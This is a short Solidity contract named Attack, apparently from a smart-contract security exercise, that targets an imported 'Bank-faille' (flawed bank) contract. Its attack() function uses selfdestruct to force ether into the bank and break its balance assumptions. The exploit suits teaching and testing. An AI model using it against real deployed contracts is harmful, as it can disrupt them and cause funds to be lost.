// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.19;

//import "./Vault.sol";
import "./7-Bank-faille.sol";

contract Attack {
    Bank public bank;

    constructor(address _bankAddress) {
        bank = Bank(_bankAddress);
    }

    fallback() external payable{}
 
  function attack() external {
        selfdestruct(payable(address(bank)));
    }
}
